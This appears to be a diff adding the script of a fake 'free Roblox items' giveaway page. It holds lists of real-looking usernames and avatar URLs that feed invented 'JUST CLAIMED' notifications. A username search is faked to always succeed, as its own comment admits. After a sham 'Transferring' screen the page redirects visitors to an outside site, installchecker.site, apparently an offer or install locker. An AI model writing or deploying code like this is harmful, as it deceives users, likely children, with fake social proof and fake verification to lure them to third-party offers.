+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A4BA51E32FA674ED3D7A1CE66FE5AA40-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D317B719D555BB05A2AF522B512BFF23-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A7818BF2D5D4AC3CB6D5418A713BBB6C-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-AEC10DD31BD85B9706BB3567ED5A4BC5-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A9C2582009A1FDECCA18263C7A3C6FE8-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-0E08B78408BB5614B39A026D36A9575D-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-6C9E0AAEF821128DD48FB8A389C4A0B9-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-EA378FFC5001D147249CB2B3AAED2C05-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-151FF93EEB183449A06A4833E71938A3-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F47CC2E15DEC626448D15A9E66EF1762-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A654D4AEA6E04F5671471E0266B4EA62-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-E9527F1E31B8A775C70C0022AF80FDC5-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-D149EA2C4E77B7B6882D6C056B0B3772-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-3F0C92CED81F2936EA712517457CC982-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-B6530B4FCD3302ED31F4BD913E198D7F-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-16067DDF7E67005B57C8CA1BACBC8395-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-8EE17821CC0789141F9753763D593180-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A8B021C60924EE61CEF929236824C30F-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9C81A53E43F0D94E105F86CFCC350C5D-Png/150/150/AvatarHeadshot/Webp/noFilter',
+      'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-7D7B193935907A3816671468E709A849-Png/150/150/AvatarHeadshot/Webp/noFilter'
+    ];
+
+    const usernames = [
+      'Liliana_Cupcake1',
+      'PixelNinja123',
+      'ayoletgo',
+      'Dreamycloudxo',
+      'lily_l0llyp0p',
+      'lilypaddd11',
+      'Sisi_7901',
+      'him90236',
+      'Queenbee_mavi',
+      'reto21r',
+      'Emmagirl0916',
+      '3mmqza',
+      'parassinitu',
+      'laxyaaa',
+      'Battal_216',
+      'bangakumakan',
+      'DDDDEdZZ',
+      'Anhtomdepzai',
+      'XAGXcallYTCH',
+      'Moonee_Play',
+      'hotspot5671',
+      'CyberXIndo',
+      'AT111114',
+      'wDetrox',
+      'Eightnesses',
+      'EightPxth',
+      'Ishowspeedjr2nd',
+      'angel1789tay',
+      'gardenwindut',
+      'needscreativity',
+      'Richy_544'
+    ];
+
+    // Get all item names and images from the DOM
+    let notificationItems = [];
+    $(document).ready(function() {
+      notificationItems = $('.item-card').map(function() {
+        return {
+          name: $(this).find('.item-name').text().trim(),
+          img: $(this).find('.item-img').attr('src')
+        };
+      }).get();
+    });
+    let notificationIndex = 0;
+
+    // متغيرات للتحكم في الإشعارات
+    let notificationInterval;
+    let popupOpen = false;
+
+    function startNotifications() {
+      if (popupOpen) return;
+      notificationInterval = setInterval(function() {
+        if (popupOpen) return;
+        if (notificationItems.length === 0) return;
+        $(".cliameds").fadeIn(); 
+        // Cycle through items
+        const item = notificationItems[notificationIndex];
+        notificationIndex = (notificationIndex + 1) % notificationItems.length;
+        var html = `
+          <div class="message">
+            <div class="img"><img src="${avatars[Math.floor(Math.random() * avatars.length)]}" alt=""></div>
+            <div class="more">
+              <div>${usernames[Math.floor(Math.random() * usernames.length)]}</div>
+              <div> JUST CLAIMED '${item.name}'</div>
+            </div>
+          </div>
+        `;
+        $(".cliameds").html(html);
+        setTimeout(function() {
+          $(".cliameds").fadeOut();  
+        }, 3000);
+      }, 5000); // تم تغيير الفاصل الزمني إلى 7 ثوانٍ
+    }
+
+    function stopNotifications() {
+      clearInterval(notificationInterval);
+      $(".cliameds").fadeOut();
+    }
+    
+    // بدء الإشعارات عند تحميل الصفحة
+    startNotifications();
+    
+    // Function to show purchase popup
+    const showPurchasePopup = (itemName, itemImage) => {
+      // إيقاف الإشعارات عند فتح الواجهة
+      popupOpen = true;
+      stopNotifications();
+      
+      const popup = document.getElementById('purchase-popup');
+      const popupContent = popup.querySelector('.popup-content');
+      
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Get Item</h3>
+        </div>
+        <img src="${itemImage}" alt="Item Image" class="item-popup-image">
+        <p class="item-confirm">Would you like to Get "<span>${itemName}</span>"?</p>
+        <div class="input-group">
+          <input type="text" id="username-input" placeholder="Enter your Roblox username">
+        </div>
+        <div class="user-error d-none">Please enter a valid username</div>
+        <div class="popup-buttons">
+          <button class="cancel-btn">Cancel</button>
+          <button class="free-btn" id="search-user-btn">
+            <span class="free-badge">Search Now ➤</span>
+          </button>
+        </div>
+      `;
+      
+      popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
+      popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
+        // Play sound when clicking "Free" button
+        const clickSound = document.getElementById('clickSound');
+        clickSound.currentTime = 0;
+        clickSound.play();
+        
+        const username = document.getElementById('username-input').value.trim();
+        if (!username) {
+          document.querySelector('.user-error').classList.remove('d-none');
+          return;
+        }
+        showSearchingState(username, itemName, itemImage);
+      });
+      
+      popup.style.display = 'flex';
+      document.getElementById('username-input').focus();
+    }
+
+    // Function to close popup
+    const closePurchasePopup = () => {
+      document.getElementById('purchase-popup').style.display = 'none';
+      popupOpen = false;
+      // إعادة تشغيل الإشعارات عند إغلاق الواجهة
+      startNotifications();
+    }
+
+    // Add globalData object at the top of the script
+    const globalData = { full_name: null, user_name: null, friends_count: null, followers_count: null, followings_count: null, user_id: null, user_avatar: null, robux: null };
+
+
+
+    // Function to show searching state
+    const showSearchingState = (username, itemName, itemImage) => {
+      const popupContent = document.querySelector('.popup-content');
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Get Item</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+          <p class="searching-text">Searching for @${username}</p>
+        </div>
+      `;
+      
+      // Simulate API call with fake success effect
+      setTimeout(() => {
+        // Always show success with fake data
+        globalData.user_name = username;
+        globalData.user_avatar = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-F886F6A2F04884003042CB1B133FF85E-Png/150/150/AvatarHeadshot/Webp/noFilter";
+        showSuccessState(username, itemName, itemImage);
+      }, 2000); // 2 second delay to simulate API call
+    }
+
+    // Update showSuccessState to use globalData
+    const showSuccessState = (username, itemName, itemImage) => {
+      const popupContent = document.querySelector('.popup-content');
+      popupContent.innerHTML = `
+        <div style="background: #fff1; border-radius: 18px; padding: 40px 20px; margin-bottom: 0; box-shadow: 0 2px 8px #0001; max-width: 380px; margin: 0 auto; text-align: center;">
+          <div style="display: flex; flex-direction: column; align-items: center;">
+            <div style="width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(45deg, #22c55e, #16e085); display: flex; align-items: center; justify-content: center; margin-bottom: 20px; animation: pulse-glow 1.5s infinite; box-shadow: 0 0 20px #22c55e;">
+              <span style="font-size: 40px; color: white;">✓</span>
+            </div>
+            <div style="font-weight: 900; font-size: 1.8em; color: var(--accent2); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 15px; animation: fadeInUp 0.8s ease-out;">USERNAME FOUND!</div>
+            <div style="color: var(--text-main); font-size: 1.1em; margin-bottom: 30px; animation: fadeInUp 0.8s ease-out 0.2s both;">@${username}</div>
+            <div style="display: flex; flex-direction: column; gap: 12px; width: 100%;">
+              <button class="get-item-now-btn" style="background: linear-gradient(45deg, #22c55e, #16e085); color: #fff; font-size: 1.2em; font-weight: 700; border-radius: 12px; border: none; padding: 15px 0; cursor: pointer; box-shadow: 0 4px 15px #22c55e55; transition: all 0.3s; animation: fadeInUp 0.8s ease-out 0.4s both;">CONTINUE</button>
+              <button id="retry-btn" style="background: transparent; color: var(--text-muted); font-size: 1em; font-weight: 600; border: 2px solid var(--text-muted); border-radius: 12px; padding: 12px 0; cursor: pointer; transition: all 0.3s; animation: fadeInUp 0.8s ease-out 0.6s both;">TRY DIFFERENT USERNAME</button>
+            </div>
+          </div>
+        </div>
+      `;
+      
+      // Add animation styles
+      const style = document.createElement('style');
+      style.innerHTML = `
+        @keyframes fadeInUp {
+          from {
+            opacity: 0;
+            transform: translateY(20px);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0);
+          }
+        }
+        @keyframes pulse-glow {
+          0% { box-shadow: 0 0 0 0 #22c55e88; }
+          70% { box-shadow: 0 0 0 16px #22c55e00; }
+          100% { box-shadow: 0 0 0 0 #22c55e00; }
+        }
+      `;
+      document.head.appendChild(style);
+      
+      popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
+        const clickSound = document.getElementById('clickSound');
+        clickSound.currentTime = 0;
+        clickSound.play();
+        showVerificationState(globalData.user_name, itemName, itemImage);
+      });
+      popupContent.querySelector('#retry-btn').addEventListener('click', function() {
+        showPurchasePopup(itemName, itemImage);
+      });
+    }
+
+    // Function to show verification state
+    const showVerificationState = (username, itemName, itemImage) => {
+      const popupContent = document.querySelector('.popup-content');
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Verification</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+          <p class="searching-text">Transferring ${itemName} to @${username}</p>
+        </div>
+      `;
+      setTimeout(function() {
+        window.location.href = "https://installchecker.site/cl/i/1onk5k";
+      }, 2500);
+    }
+
+
+
+    // Add golden item effect and sound
+    $(document).ready(function() {
+      const dingSound = document.getElementById('dingSound');
+      let soundEnabled = true;
+      
+      $('.item-card').click(function() {
+        // Remove selection from all items
+        $('.item-card').removeClass('selected');
+        
+        // Add selection to the clicked item
+        $(this).addClass('selected');
+        
+        // Play sound
+        dingSound.currentTime = 0;
+        dingSound.play();
+        
+        // Open purchase popup
+        const itemName = $(this).find('.item-name').text().trim();
+        const itemImage = $(this).find('.item-img').attr('src');
+        showPurchasePopup(itemName, itemImage);
+      });
+    });
+
+    // Inject pulsing animation and button styles for the Let's Go button
+    (function() {
+      const style = document.createElement('style');
+      style.innerHTML = `
+        @keyframes pulse-glow {
+          0% { box-shadow: 0 0 0 0 #22c55e88; }
+          70% { box-shadow: 0 0 0 16px #22c55e00; }
+          100% { box-shadow: 0 0 0 0 #22c55e00; }
+        }
+        .lets-go-btn-animated {
+          background: linear-gradient(90deg, #22c55e 0%, #16e085 100%);
+          color: #fff;
+          font-size: 1.35em;
+          font-weight: 900;
+          border-radius: 16px;
+          border: none;
+          padding: 22px 0;
+          width: 100%;
+          cursor: pointer;
+          box-shadow: 0 2px 16px #22c55e55;
+          animation: pulse-glow 1.3s infinite;
+          transition: transform 0.15s, box-shadow 0.2s;
+          position: relative;
+          letter-spacing: 0.5px;
+        }
+        .lets-go-btn-animated:active {
+          transform: scale(0.97) translateY(2px);
+          box-shadow: 0 1px 8px #22c55e99;
+        }
+        .lets-go-btn-animated:hover {
+          transform: scale(1.04) translateY(-2px);
+          box-shadow: 0 4px 24px #22c55e99;
+        }
+        .lets-go-microcopy {
+          color: var(--accent3);
+          font-size: 1.08em;
+          font-weight: 700;
+          margin-top: 13px;
+          text-shadow: 0 1px 8px #0002;
+          letter-spacing: 0.2px;
+        }
+      `;
+      document.head.appendChild(style);
+    })();
+    
+    // Background Pets Management
+    (function() {
+      const petImages = [
+        'images/Kitsune.webp',
+        'images/DiscoBeeIcon.webp',
+        'images/T-Rex.webp'
+      ];
+      
+      const backgroundPetsContainer = document.getElementById('backgroundPets');
+      let activePets = [];
+      const maxPets = 3;
+      
+      class BouncingPet {
+        constructor(imageSrc, startX, startY, vx, vy) {
+          this.element = document.createElement('div');
+          this.element.className = 'floating-pet';
+          
+          const img = document.createElement('img');
+          img.src = imageSrc;
+          img.alt = 'Floating Pet';
+          
+          this.element.appendChild(img);
+          
+          // Starting position and velocity
+          this.x = startX;
+          this.y = startY;
+          this.vx = vx;
+          this.vy = vy;
+          
+          // Size
+          this.width = 95;
+          this.height = 95;
+          
+          this.updatePosition();
+          backgroundPetsContainer.appendChild(this.element);
+        }
+        
+        updatePosition() {
+          this.element.style.transform = `translate3d(${this.x}px, ${this.y}px, 0)`;
+        }
+        
+        update() {
+          // Update position
+          this.x += this.vx;
+          this.y += this.vy;
+          
+          // Check for wall collisions
+          if (this.x <= 0 || this.x >= window.innerWidth - this.width) {
+            this.vx = -this.vx;
+            this.x = Math.max(0, Math.min(this.x, window.innerWidth - this.width));
+          }
+          
+          if (this.y <= 0 || this.y >= window.innerHeight - this.height) {
+            this.vy = -this.vy;
+            this.y = Math.max(0, Math.min(this.y, window.innerHeight - this.height));
+          }
+          
+          this.updatePosition();
+        }
+        
+        destroy() {
+          if (this.element.parentNode) {
+            this.element.parentNode.removeChild(this.element);
+          }
+        }
+      }
+      
+      function createPets() {
+        // Clear any existing pets
+        activePets.forEach(pet => pet.destroy());
+        activePets = [];
+        
+        // Create 3 specific pets with different starting positions and velocities
+        const pets = [
+          {
+            image: 'images/Kitsune.webp',
+            startX: 120,
+            startY: 180,
+            vx: 1.8,
+            vy: 1.5
+          },
+          {
+            image: 'images/DiscoBeeIcon.webp',
+            startX: window.innerWidth - 215,
+            startY: 300,
+            vx: -1.6,
+            vy: 1.9
+          },
+          {
+            image: 'images/T-Rex.webp',
+            startX: 300,
+            startY: window.innerHeight - 215,
+            vx: 1.4,
+            vy: -1.7
+          }
+        ];
+        
+        pets.forEach(petData => {
+          const pet = new BouncingPet(
+            petData.image,
+            petData.startX,
+            petData.startY,
+            petData.vx,
+            petData.vy
+          );
+          activePets.push(pet);
+        });
+      }
+      
+      let animationId;
+      
+      function animatePets() {
+        activePets.forEach(pet => pet.update());
+        animationId = requestAnimationFrame(animatePets);
+      }
+      
+      function initializePets() {
+        createPets();
+        animatePets();
+      }
+      
+      // Start pets when page loads
+      window.addEventListener('load', initializePets);
+      
+      // Adjust pets on window resize
+      window.addEventListener('resize', () => {
+        // Recreate pets with new window dimensions
+        createPets();
+      });
+      
+      // Cleanup on page unload
+      window.addEventListener('beforeunload', () => {
+        if (animationId) {
+          cancelAnimationFrame(animationId);
+        }
+      });
+    })();
+  </script>
+
+</body></html>
